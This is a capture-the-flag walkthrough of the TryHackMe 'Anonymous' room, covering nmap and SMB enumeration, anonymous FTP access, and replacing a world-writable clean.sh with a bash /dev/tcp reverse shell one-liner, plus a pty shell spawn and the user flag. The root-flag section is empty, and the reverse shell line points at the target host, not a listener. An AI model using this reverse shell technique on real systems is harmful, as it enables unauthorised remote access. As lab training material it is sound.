# Anonymous

<div align="left">

<figure><img src=".gitbook/assets/Anonymous_emblem.svg.png" alt="" width="188"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗 [Anonymous](https://tryhackme.com/room/anonymous)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.32.229`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.32.229 anonymous.thm" >> /etc/hosts

mkdir thm/anonymous.thm  
cd thm/anonymous.thm

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 anonymous.thm 
PING anonymous.thm (10.10.32.229) 56(84) bytes of data.
64 bytes from anonymous.thm (10.10.32.229): icmp_seq=1 ttl=63 time=60.8 ms
64 bytes from anonymous.thm (10.10.32.229): icmp_seq=2 ttl=63 time=58.9 ms
64 bytes from anonymous.thm (10.10.32.229): icmp_seq=3 ttl=63 time=58.9 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

### 2.1 - Enumerate the machine.  How many ports are open?

```bash
nmap --open -p0- -n -Pn -vvv -T4 anonymous.thm
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-12 18:16 EDT
Initiating SYN Stealth Scan at 18:16
Scanning anonymous.thm (10.10.32.229) [65536 ports]
Discovered open port 21/tcp on 10.10.32.229
Discovered open port 445/tcp on 10.10.32.229
Discovered open port 22/tcp on 10.10.32.229
Discovered open port 139/tcp on 10.10.32.229
Completed SYN Stealth Scan at 18:17, 36.30s elapsed (65536 total ports)
Nmap scan report for anonymous.thm (10.10.32.229)
Host is up, received user-set (0.098s latency).
Scanned at 2023-07-12 18:16:59 EDT for 37s
Not shown: 65434 closed tcp ports (reset), 98 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 4 open ports on the machine: 21, 22, 139, 445.

{% hint style="info" %}
4
{% endhint %}

### 2.2 - What service is running on port 21?

```bash
nmap -p21,22,139,445 -sCV -n -Pn -vvv -T4 anonymous.thm
```

```bash
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.80.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCi47ePYjDctfwgAphABwT1jpPkKajXoLvf3bb/zvpvDvXwWKnm6nZuzL2HA1veSQa90ydSSpg8S+B8SLpkFycv7iSy2/Jmf7qY+8oQxWThH1fwBMIO5g/TTtRRta6IPoKaMCle8hnp5pSP5D4saCpSW3E5rKd8qj3oAj6S8TWgE9cBNJbMRtVu1+sKjUy/7ymikcPGAjRSSaFDroF9fmGDQtd61oU5waKqurhZpre70UfOkZGWt6954rwbXthTeEjf+4J5+gIPDLcKzVO7BxkuJgTqk4lE9ZU/5INBXGpgI5r4mZknbEPJKS47XaOvkqm9QWveoOSQgkqdhIPjnhD
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPjHnAlR7sBuoSM2X5sATLllsFrcUNpTS87qXzhMD99aGGzyOlnWmjHGNmm34cWSzOohxhoK2fv9NWwcIQ5A/ng=
|   256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDHIuFL9AdcmaAIY7u+aJil1covB44FA632BSQ7sUqap
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open              syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2023-07-12T22:17:54
|_  start_date: N/A
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2023-07-12T22:17:54+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63881/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 37451/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 33823/udp): CLEAN (Failed to receive data)
|   Check 4 (port 56889/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

```bash
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.80.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

{% hint style="info" %}
FTP
{% endhint %}

### 2.3 - What service is running on ports 139 and 445? 

<pre class="language-bash"><code class="lang-bash">PORT    STATE SERVICE     REASON         VERSION
<strong>139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</strong>445/tcp open  Eetbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
</code></pre>

{% hint style="info" %}
SMB
{% endhint %}

### 2.4 - There's a share on the user's computer.  What's it called? 

```bash
smbmap -H anonymous.thm
```

```bash
[+] Guest session   	IP: anonymous.thm:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	pics                                              	READ ONLY	My SMB Share Directory for Pics
	IPC$                                              	NO ACCESS	IPC Service (anonymous server (Samba, Ubuntu))
```

We can see that the share's name is:\


{% hint style="info" %}
pics
{% endhint %}

### 2.5 - Find user flag

\
Now, we explore others open ports starting with FTP (21):

```bash
ftp anonymous.thm
```

```bash
Connected to anonymous.thm.
220 NamelessOne's FTP Server!
Name (anonymous.thm:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||22172|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
```

We see that scripts directory has all permessions, jump in!

```bash
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||63113|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2709 Jul 12 22:43 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

Save all them using get command:

```bash
ftp> get clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||51458|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |***********************************************************************|   314       67.54 KiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (4.81 KiB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
229 Entering Extended Passive Mode (|||56452|)
150 Opening BINARY mode data connection for removed_files.log (2752 bytes).
100% |***********************************************************************|  2752        6.37 MiB/s    00:00 ETA
226 Transfer complete.
2752 bytes received in 00:00 (43.09 KiB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
229 Entering Extended Passive Mode (|||61628|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |***********************************************************************|    68      400.03 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (1.08 KiB/s)
ftp> quit
221 Goodbye.
```

Using cat, we can read files:

<figure><img src=".gitbook/assets/Schermata del 2023-07-13 01-32-54.png" alt=""><figcaption></figcaption></figure>

Focusing on clean.sh file (that have all permissions), we can erase the bucket and put into a reverse shell script (re-uploading it).

We found reverse shell scripts on [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), and we save it into a new file with duplicate name: clean.sh:

```bash
bash -i >& /dev/tcp/anonymous.thm/4444 0>&1
```







flag is usually in the path: /home

```bash
cd /home
ls
bolt
composer-setup.php
flag.txt
cat flag.txt
```

or we can spawn a bash shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
find / -type f -name 'flag.txt' 2>/dev/null
cat /root/flag.txt
```

<details>

<summary>🚩 Flag 1 (flag.txt)</summary>

THM{wh0\_d035nt\_l0ve5\_b0l7\_r1gh7?}

</details>









### 2.6 - Find root flag







